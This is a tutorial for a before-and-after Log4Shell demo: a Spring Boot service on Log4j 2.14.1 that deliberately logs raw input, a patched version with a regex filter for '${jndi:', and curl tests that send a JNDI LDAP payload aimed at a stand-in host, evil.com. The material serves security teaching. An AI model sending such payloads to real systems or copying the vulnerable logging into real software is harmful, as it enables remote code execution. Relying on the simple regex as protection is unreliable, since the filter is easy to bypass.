# Simple Log4Shell Demo Setup

## Project Structure
```
log4shell-demo/
├── before/     # Vulnerable version
└── after/      # Secure version
```

## Step 1: Create Before Folder (Vulnerable)

```bash
# Create and enter before folder
mkdir -p log4shell-demo/before
cd log4shell-demo/before

# Create vulnerable pom.xml
cat > pom.xml << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0">
    <modelVersion>4.0.0</modelVersion>
    
    <groupId>com.example</groupId>
    <artifactId>log4shell-demo</artifactId>
    <version>1.0.0</version>
    <packaging>jar</packaging>
    
    <parent>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-parent</artifactId>
        <version>2.5.5</version>
    </parent>
    
    <properties>
        <java.version>11</java.version>
    </properties>
    
    <dependencies>
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-web</artifactId>
            <exclusions>
                <exclusion>
                    <groupId>org.springframework.boot</groupId>
                    <artifactId>spring-boot-starter-logging</artifactId>
                </exclusion>
            </exclusions>
        </dependency>
        
        <dependency>
            <groupId>org.apache.logging.log4j</groupId>
            <artifactId>log4j-core</artifactId>
            <version>2.14.1</version>
        </dependency>
        <dependency>
            <groupId>org.apache.logging.log4j</groupId>
            <artifactId>log4j-api</artifactId>
            <version>2.14.1</version>
        </dependency>
        <dependency>
            <groupId>org.apache.logging.log4j</groupId>
            <artifactId>log4j-slf4j-impl</artifactId>
            <version>2.14.1</version>
        </dependency>
    </dependencies>
    
    <build>
        <plugins>
            <plugin>
                <groupId>org.springframework.boot</groupId>
                <artifactId>spring-boot-maven-plugin</artifactId>
            </plugin>
        </plugins>
    </build>
</project>
EOF

# Create source directory
mkdir -p src/main/java/com/example

# Create main application
cat > src/main/java/com/example/DemoApplication.java << 'EOF'
package com.example;

import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;

@SpringBootApplication
public class DemoApplication {
    public static void main(String[] args) {
        SpringApplication.run(DemoApplication.class, args);
    }
}
EOF

# Create vulnerable controller
cat > src/main/java/com/example/LogController.java << 'EOF'
package com.example;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.springframework.web.bind.annotation.*;

@RestController
public class LogController {
    
    private static final Logger logger = LogManager.getLogger(LogController.class);
    
    @PostMapping("/log")
    public String logInput(@RequestBody String input) {
        logger.info("User input: " + input);
        return "Logged: " + input;
    }
    
    @GetMapping("/health")
    public String health() {
        return "Status: VULNERABLE - Log4j 2.14.1";
    }
}
EOF

# Create Docker files
cat > Dockerfile << 'EOF'
FROM maven:3.8.5-openjdk-11 AS build
WORKDIR /app
COPY . .
RUN mvn clean package -DskipTests

FROM openjdk:11-jre-slim
WORKDIR /app
COPY --from=build /app/target/*.jar app.jar
EXPOSE 8080
ENTRYPOINT ["java", "-jar", "app.jar"]
EOF

cat > docker-compose.yml << 'EOF'
version: '3.8'
services:
  app:
    build: .
    ports:
      - "8080:8080"
    container_name: vulnerable-app
EOF
```

## Step 2: Create After Folder (Secure)

```bash
# Create and enter after folder
cd ../
mkdir after
cd after

# Create secure pom.xml
cat > pom.xml << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0">
    <modelVersion>4.0.0</modelVersion>
    
    <groupId>com.example</groupId>
    <artifactId>log4shell-demo</artifactId>
    <version>2.0.0</version>
    <packaging>jar</packaging>
    
    <parent>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-parent</artifactId>
        <version>2.5.5</version>
    </parent>
    
    <properties>
        <java.version>11</java.version>
    </properties>
    
    <dependencies>
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-web</artifactId>
            <exclusions>
                <exclusion>
                    <groupId>org.springframework.boot</groupId>
                    <artifactId>spring-boot-starter-logging</artifactId>
                </exclusion>
            </exclusions>
        </dependency>
        
        <dependency>
            <groupId>org.apache.logging.log4j</groupId>
            <artifactId>log4j-core</artifactId>
            <version>2.17.1</version>
        </dependency>
        <dependency>
            <groupId>org.apache.logging.log4j</groupId>
            <artifactId>log4j-api</artifactId>
            <version>2.17.1</version>
        </dependency>
        <dependency>
            <groupId>org.apache.logging.log4j</groupId>
            <artifactId>log4j-slf4j-impl</artifactId>
            <version>2.17.1</version>
        </dependency>
    </dependencies>
    
    <build>
        <plugins>
            <plugin>
                <groupId>org.springframework.boot</groupId>
                <artifactId>spring-boot-maven-plugin</artifactId>
            </plugin>
        </plugins>
    </build>
</project>
EOF

# Create source directory
mkdir -p src/main/java/com/example

# Create main application
cat > src/main/java/com/example/DemoApplication.java << 'EOF'
package com.example;

import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;

@SpringBootApplication
public class DemoApplication {
    public static void main(String[] args) {
        SpringApplication.run(DemoApplication.class, args);
    }
}
EOF

# Create secure controller
cat > src/main/java/com/example/LogController.java << 'EOF'
package com.example;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.springframework.web.bind.annotation.*;
import org.springframework.http.ResponseEntity;
import java.util.regex.Pattern;

@RestController
public class LogController {
    
    private static final Logger logger = LogManager.getLogger(LogController.class);
    private static final Pattern JNDI_PATTERN = Pattern.compile("\\$\\{jndi:", Pattern.CASE_INSENSITIVE);
    private static int blockedCount = 0;
    
    @PostMapping("/log")
    public ResponseEntity<String> logInput(@RequestBody String input) {
        if (JNDI_PATTERN.matcher(input).find()) {
            blockedCount++;
            logger.warn("BLOCKED: JNDI injection attempt");
            return ResponseEntity.badRequest().body("BLOCKED: Security violation detected");
        }
        
        logger.info("User input: " + input);
        return ResponseEntity.ok("Logged: " + input);
    }
    
    @GetMapping("/health")
    public String health() {
        return "Status: SECURE - Log4j 2.17.1 - Blocked attempts: " + blockedCount;
    }
}
EOF

# Create Docker files
cat > Dockerfile << 'EOF'
FROM maven:3.8.5-openjdk-11 AS build
WORKDIR /app
COPY . .
RUN mvn clean package -DskipTests

FROM openjdk:11-jre-slim
WORKDIR /app
COPY --from=build /app/target/*.jar app.jar
EXPOSE 8080
ENTRYPOINT ["java", "-jar", "app.jar"]
EOF

cat > docker-compose.yml << 'EOF'
version: '3.8'
services:
  app:
    build: .
    ports:
      - "8080:8080"
    container_name: secure-app
EOF
```

## Simple Demo Commands

### Test Vulnerable Version
```bash
cd log4shell-demo/before/
docker-compose up --build -d
sleep 15

# Normal test
curl -X POST http://localhost:8080/log -H "Content-Type: application/json" -d '"Hello"'

# Attack test
curl -X POST http://localhost:8080/log -H "Content-Type: application/json" -d '"${jndi:ldap://evil.com/attack}"'

# Check status
curl http://localhost:8080/health

docker-compose down
```

### Test Secure Version
```bash
cd ../after/
docker-compose up --build -d
sleep 15

# Normal test
curl -X POST http://localhost:8080/log -H "Content-Type: application/json" -d '"Hello"'

# Attack test (should be blocked)
curl -X POST http://localhost:8080/log -H "Content-Type: application/json" -d '"${jndi:ldap://evil.com/attack}"'

# Check status
curl http://localhost:8080/health

docker-compose down
```

## Expected Results

**Before (Vulnerable):**
- Normal input: "Logged: Hello"
- Attack input: "Logged: ${jndi:ldap://evil.com/attack}" (processes attack)
- Health: "Status: VULNERABLE - Log4j 2.14.1"

**After (Secure):**
- Normal input: "Logged: Hello" 
- Attack input: "BLOCKED: Security violation detected"
- Health: "Status: SECURE - Log4j 2.17.1 - Blocked attempts: 1"

Simple, clear, and demonstrates the key difference!